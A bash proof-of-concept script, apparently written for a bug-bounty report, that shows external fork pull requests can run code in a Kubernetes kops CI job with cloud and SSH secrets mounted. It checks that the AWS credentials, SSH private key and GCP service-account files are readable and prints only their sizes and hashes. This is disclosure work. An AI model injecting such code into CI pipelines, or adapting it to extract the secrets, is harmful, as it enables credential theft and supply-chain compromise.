#!/usr/bin/env bash
# Authorized HackerOne bug-bounty PoC (marker: hackerone-an1msh), submitted with the
# knowledge and request of the Kubernetes security team.
#
# Purpose: benignly demonstrate that code from an EXTERNAL FORK pull request executes in
# the pull-kops-e2e-k8s-aws-calico presubmit container with the CI cloud/SSH secrets mounted
# and readable.
#
# Safety: this script ONLY proves each secret file is present and readable, by printing its
# byte size and SHA-256 digest. It does NOT print, decode, transmit, or use any secret value,
# and it authenticates to no cloud/SSH API. It then exits non-zero so the e2e job aborts
# BEFORE kubetest2 builds its deployer and BEFORE any cloud resource is created.
set -u
echo "=== hackerone-an1msh PoC START ==="
echo "marker: hackerone-an1msh"
echo "id: $(id 2>/dev/null)"
echo "hostname: $(hostname 2>/dev/null)"
for f in \
  "${AWS_SHARED_CREDENTIALS_FILE:-/etc/aws-cred/credentials}" \
  "${AWS_SSH_PRIVATE_KEY_FILE:-/etc/aws-ssh/aws-ssh-private}" \
  "${GOOGLE_APPLICATION_CREDENTIALS:-/etc/service-account/service-account.json}"; do
  if [ -r "$f" ]; then
    echo "READABLE ${f} bytes=$(wc -c < "$f") sha256=$(sha256sum "$f" | cut -d' ' -f1)"
  else
    echo "NOT-READABLE ${f}"
  fi
done
echo "NOTE: secret contents were deliberately not printed, decoded, transmitted, or used."
echo "=== hackerone-an1msh PoC END (aborting job before any cloud action) ==="
exit 1
